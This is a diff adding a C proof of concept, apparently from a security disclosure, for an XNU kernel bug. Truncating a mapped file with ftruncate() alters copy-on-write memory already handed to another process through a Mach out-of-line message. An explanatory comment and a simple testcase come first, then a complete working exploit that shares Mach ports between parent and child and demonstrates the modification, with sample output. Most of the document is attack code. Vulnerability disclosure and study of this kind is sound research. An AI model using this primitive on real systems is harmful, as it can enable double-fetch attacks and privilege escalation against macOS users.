@@ -1,0 +1,464 @@
+/*
+XNU has various interfaces that permit creating copy-on-write copies of data
+between processes, including out-of-line message descriptors in mach messages.
+It is important that the copied memory is protected against later modifications
+by the source process; otherwise, the source process might be able to exploit
+double-reads in the destination process.
+
+This copy-on-write behavior works not only with anonymous memory, but also with
+file mappings. This means that, if the filesystem mutates the file contents
+(e.g. because the ftruncate() syscall was used), the filesystem must inform the
+memory management subsystem so that affected pages can be deduplicated.
+If this doesn't happen, that's a security bug.
+
+
+ubc_setsize_ex() roughly has the following logic:
+
+Step 1: If the file grows or stays at the same size, do nothing and return.
+Step 2: If the new file size is not divisible by the page size, zero out the end
+        of the page that is now at the end of the file.
+Step 3: If there are pages that were previously part of the file but aren't
+        anymore, tell the memory management subsystem to invalidate them.
+Step 4: Return.
+
+Step 2 is implemented as follows:
+
+===========
+        /*
+         * new EOF ends up in the middle of a page
+         * zero the tail of this page if it's currently
+         * present in the cache
+         
+        kret = ubc_create_upl_kernel(vp, lastpg, PAGE_SIZE, &upl, &pl, UPL_SET_LITE, VM_KERN_MEMORY_FILE);
+
+        if (kret != KERN_SUCCESS)
+                panic("ubc_setsize: ubc_create_upl (error = %d)\n", kret);
+
+        if (upl_valid_page(pl, 0))
+                cluster_zero(upl, (uint32_t)lastoff, PAGE_SIZE - (uint32_t)lastoff, NULL);
+
+        ubc_upl_abort_range(upl, 0, PAGE_SIZE, UPL_ABORT_FREE_ON_EMPTY);
+===========
+
+Call graph:
+
+ubc_create_upl_kernel(uplflags=UPL_SET_LITE)
+-> memory_object_upl_request(cntrl_flags=UPL_SET_LITE|UPL_NO_SYNC|UPL_CLEAN_IN_PLACE|UPL_SET_INTERNAL)
+-> vm_object_upl_request(cntrl_flags=UPL_SET_LITE|UPL_NO_SYNC|UPL_CLEAN_IN_PLACE|UPL_SET_INTERNAL)
+
+vm_object_upl_request() can perform COW deduplication, but only if the
+UPL_WILL_MODIFY flag is set, which isn't set here.
+
+
+A simple testcase:
+
+===========
+$ cat buggycow2.c 
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+#include <unistd.h>
+
+int main(void) {
+ setbuf(stdout, NULL);
+
+ int fd = open("testfile", O_RDWR|O_CREAT|O_TRUNC, 0600);
+ if (fd == -1) err(1, "open");
+ if (ftruncate(fd, 0x4000)) err(1, "ftruncate 1");
+ char *mapping = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+ if (mapping == MAP_FAILED) err(1, "mmap");
+ *(unsigned int *)(mapping + 0x3000) = 0x41414141;
+
+ pointer_t cow_mapping;
+ mach_msg_type_number_t cow_mapping_size;
+ if (vm_read(mach_task_self(), (vm_address_t)mapping, 0x4000, &cow_mapping, &cow_mapping_size) != KERN_SUCCESS) errx(1, "vm read");
+ if (cow_mapping_size != 0x4000) errx(1, "vm read size");
+ printf("orig: 0x%x cow: 0x%x\n", *(unsigned int *)(mapping + 0x3000), *(unsigned int *)(cow_mapping+0x3000));
+
+ if (ftruncate(fd, 0x3001)) err(1, "ftruncate 2");
+
+ printf("orig: 0x%x cow: 0x%x\n", *(unsigned int *)(mapping + 0x3000), *(unsigned int *)(cow_mapping+0x3000));
+}
+$ cc -o buggycow2 buggycow2.c 
+$ ./buggycow2
+orig: 0x41414141 cow: 0x41414141
+orig: 0x41 cow: 0x41
+$
+===========
+
+
+To demonstrate that this also works with out-of-line memory sent over mach
+ports, I am attaching a more complicated PoC that was mostly written by Ian.
+It sends an out-of-line descriptor over a mach port, then changes the memory
+seen by the recipient.
+
+Usage:
+
+===========
+$ cc -o mach_truncate_poc mach_truncate_poc.c
+$ ./mach_truncate_poc
+[+] child got stashed port
+[+] child sent hello message to parent over shared port
+[+] parent received hello message from child
+[+] child restored stolen port
+[+] file created
+[+] child sent message to parent
+[+] parent got an OOL descriptor for 4000 bytes, mapped COW at: 0x10c213000
+[+] parent reads: 41414141
+[+] telling child to try to change what I see!
+[+] child received ping to start trying to change the OOL memory!
+[+] child called ftruncate()
+[+] parent got ping message from child, lets try to read again...
+[+] parent reads: 00000041
+$
+===========
+
+The simple testcase was tested on 10.14.1 18B75.
+*/
+
+#define RAM_GB 16ULL
+#define SIZE ((RAM_GB+4ULL) * 1024ULL * 1024ULL * 1024ULL)
+
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+
+#include <sys/mman.h>
+#include <sys/stat.h>
+
+#include <libkern/OSAtomic.h>
+#include <mach/mach.h>
+#include <mach/mach_error.h>
+#include <mach/mach_vm.h>
+#include <mach/task.h>
+#include <mach/task_special_ports.h>
+
+#define MACH_ERR(str, err) do { \
+  if (err != KERN_SUCCESS) {    \
+    mach_error("[-]" str "\n", err); \
+    exit(EXIT_FAILURE);         \
+  }                             \
+} while(0)
+
+#define FAIL(str) do { \
+  printf("[-] " str "\n");  \
+  exit(EXIT_FAILURE);  \
+} while (0)
+
+#define LOG(str) do { \
+  printf("[+] " str"\n"); \
+} while (0)
+
+/***************
+ * port dancer *
+ ***************/
+
+// set up a shared mach port pair from a child process back to its parent without using launchd
+// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html
+
+// mach message for sending a port right
+typedef struct {
+  mach_msg_header_t header;
+  mach_msg_body_t body;
+  mach_msg_port_descriptor_t port;
+} port_msg_send_t;
+
+// mach message for receiving a port right
+typedef struct {
+  mach_msg_header_t header;
+  mach_msg_body_t body;
+  mach_msg_port_descriptor_t port;
+  mach_msg_trailer_t trailer;
+} port_msg_rcv_t;
+
+typedef struct {
+  mach_msg_header_t  header;
+} simple_msg_send_t;
+
+typedef struct {
+  mach_msg_header_t  header;
+  mach_msg_trailer_t trailer;
+} simple_msg_rcv_t;
+
+#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT
+
+// a copy in the parent of the stolen special port such that it can be restored
+mach_port_t saved_special_port = MACH_PORT_NULL;
+
+// the shared port right in the parent
+mach_port_t shared_port_parent = MACH_PORT_NULL;
+
+void setup_shared_port() {
+  kern_return_t err;
+  // get a send right to the port we're going to overwrite so that we can both
+  // restore it for ourselves and send it to our child
+  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
+  MACH_ERR("saving original special port value", err);
+
+  // allocate the shared port we want our child to have a send right to
+  err = mach_port_allocate(mach_task_self(),
+                           MACH_PORT_RIGHT_RECEIVE,
+                           &shared_port_parent);
+
+  MACH_ERR("allocating shared port", err);
+
+  // insert the send right
+  err = mach_port_insert_right(mach_task_self(),
+                               shared_port_parent,
+                               shared_port_parent,
+                               MACH_MSG_TYPE_MAKE_SEND);
+  MACH_ERR("inserting MAKE_SEND into shared port", err);
+
+  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
+  MACH_ERR("setting special port", err);
+}
+
+mach_port_t recover_shared_port_child() {
+  kern_return_t err;
+
+  // grab the shared port which our parent stashed somewhere in the special ports
+  mach_port_t shared_port_child = MACH_PORT_NULL;
+  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
+  MACH_ERR("child getting stashed port", err);
+
+  LOG("child got stashed port");
+
+  // say hello to our parent and send a reply port so it can send us back the special port to restore
+
+  // allocate a reply port
+  mach_port_t reply_port;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
+  MACH_ERR("child allocating reply port", err);
+
+  // send the reply port in a hello message
+  simple_msg_send_t msg = {0};
+
+  msg.header.msgh_size = sizeof(msg);
+  msg.header.msgh_local_port = reply_port;
+  msg.header.msgh_remote_port = shared_port_child;
+
+  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+
+  err = mach_msg_send(&msg.header);
+  MACH_ERR("child sending task port message", err);
+
+  LOG("child sent hello message to parent over shared port");
+
+  // wait for a message on the reply port containing the stolen port to restore
+  port_msg_rcv_t stolen_port_msg = {0};
+  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+  MACH_ERR("child receiving stolen port\n", err);
+
+  // extract the port right from the message
+  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
+  if (stolen_port_to_restore == MACH_PORT_NULL) {
+    FAIL("child received invalid stolen port to restore");
+  }
+
+  // restore the special port for the child
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
+  MACH_ERR("child restoring special port", err);
+
+  LOG("child restored stolen port");
+  return shared_port_child;
+}
+
+mach_port_t recover_shared_port_parent() {
+  kern_return_t err;
+
+  // restore the special port for ourselves
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
+  MACH_ERR("parent restoring special port", err);
+
+  // wait for a message from the child on the shared port
+  simple_msg_rcv_t msg = {0};
+  err = mach_msg(&msg.header,
+                 MACH_RCV_MSG,
+                 0,
+                 sizeof(msg),
+                 shared_port_parent,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  MACH_ERR("parent receiving child hello message", err);
+
+  LOG("parent received hello message from child");
+
+  // send the special port to our child over the hello message's reply port
+  port_msg_send_t special_port_msg = {0};
+
+  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
+  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
+  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
+  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
+  special_port_msg.body.msgh_descriptor_count = 1;
+
+  special_port_msg.port.name        = saved_special_port;
+  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
+  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;
+
+  err = mach_msg_send(&special_port_msg.header);
+  MACH_ERR("parent sending special port back to child", err);
+
+  return shared_port_parent;
+}
+
+/*** end of port dancer code ***/
+
+
+struct ool_send_msg {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t desc;
+};
+
+struct ool_rcv_msg {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t desc;
+  mach_msg_trailer_t trailer;
+};
+
+struct ping_send_msg {
+  mach_msg_header_t hdr;
+};
+
+struct ping_rcv_msg {
+  mach_msg_header_t hdr;
+  mach_msg_trailer_t trailer;
+};
+
+void do_child(mach_port_t shared_port) {
+  kern_return_t err;
+
+  // create a reply port to receive an ack that we should truncate the file
+  mach_port_t reply_port;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
+  MACH_ERR("child allocating reply port", err);
+
+  // create a file that is a few pages big
+  int fd = open("testfile", O_RDWR|O_CREAT|O_TRUNC, 0666);
+  if (fd == -1) FAIL("create testfile");
+  if (ftruncate(fd, 0x4000)) FAIL("resize testfile");
+  LOG("file created");
+
+  void* mapping = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED) FAIL("mmap created file");
+  *(unsigned int *)mapping = 0x41414141;
+
+  struct ool_send_msg msg = {0};
+
+  msg.hdr.msgh_size = sizeof(msg);
+  msg.hdr.msgh_local_port = reply_port;
+  msg.hdr.msgh_remote_port = shared_port;
+  msg.hdr.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND) | MACH_MSGH_BITS_COMPLEX;
+
+  msg.body.msgh_descriptor_count = 1;
+
+  msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;
+  msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
+  msg.desc.deallocate = 0;
+  msg.desc.address = mapping;
+  msg.desc.size = 0x4000;
+
+  err = mach_msg_send(&msg.hdr);
+  MACH_ERR("child sending OOL message", err);
+
+  LOG("child sent message to parent");
+
+  // wait for an ack to change the file:
+  struct ping_rcv_msg ping_rcv = {0};
+  ping_rcv.hdr.msgh_size = sizeof(ping_rcv);
+  ping_rcv.hdr.msgh_local_port = reply_port;
+  err = mach_msg_receive(&ping_rcv.hdr);
+  MACH_ERR("child receiving ping to change OOL memory", err);
+
+  LOG("child received ping to start trying to change the OOL memory!");
+
+  // trigger the bug by calling ftruncate()
+  if (ftruncate(fd, 1)) FAIL("truncate file to trigger bug");
+  LOG("child called ftruncate()");	
+
+  // send a message to read again:
+  struct ping_send_msg ping = {0};
+  ping.hdr.msgh_size = sizeof(ping);
+  ping.hdr.msgh_remote_port = shared_port;
+  ping.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+
+  err = mach_msg_send(&ping.hdr);
+  MACH_ERR("parent sending ping to child", err);
+  
+  // spin and let our parent kill us
+  while(1){;}
+}
+
+void do_parent(mach_port_t shared_port) {
+  kern_return_t err;
+
+  // wait for our child to send us an OOL message
+  struct ool_rcv_msg msg = {0};
+  msg.hdr.msgh_local_port = shared_port;
+  msg.hdr.msgh_size = sizeof(msg);
+  err = mach_msg_receive(&msg.hdr);
+  MACH_ERR("parent receiving child OOL message", err);
+
+  volatile uint32_t* parent_cow_mapping = msg.desc.address;
+  uint32_t parent_cow_size = msg.desc.size;
+
+  printf("[+] parent got an OOL descriptor for %x bytes, mapped COW at: %p\n", parent_cow_size, (void*) parent_cow_mapping);
+
+  printf("[+] parent reads: %08x\n", *parent_cow_mapping);
+
+  LOG("telling child to try to change what I see!");
+
+  mach_port_t parent_to_child_port = msg.hdr.msgh_remote_port;
+
+  struct ping_send_msg ping = {0};
+  ping.hdr.msgh_size = sizeof(ping);
+  ping.hdr.msgh_remote_port = parent_to_child_port;
+  ping.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+
+  err = mach_msg_send(&ping.hdr);
+  MACH_ERR("parent sending ping to child", err);
+
+  // wait until we should try to read again:
+  struct ping_rcv_msg ping_rcv = {0};
+  ping_rcv.hdr.msgh_size = sizeof(ping_rcv);
+  ping_rcv.hdr.msgh_local_port = shared_port;
+  err = mach_msg_receive(&ping_rcv.hdr);
+  MACH_ERR("parent receiving ping to try another read", err);
+
+  LOG("parent got ping message from child, lets try to read again...");
+  
+  printf("[+] parent reads: %08x\n", *parent_cow_mapping);
+}
+
+int main(int argc, char** argv) {
+  setup_shared_port();
+
+  pid_t child_pid = fork();
+  if (child_pid == -1) {
+    FAIL("forking");
+  }
+
+  if (child_pid == 0) {
+    mach_port_t shared_port_child = recover_shared_port_child();
+    do_child(shared_port_child);
+  } else {
+    mach_port_t shared_port_parent = recover_shared_port_parent();
+    do_parent(shared_port_parent);
+  }
+
+  kill(child_pid, 9);
+  int status;
+  wait(&status); 
+
+  return 0;
+}
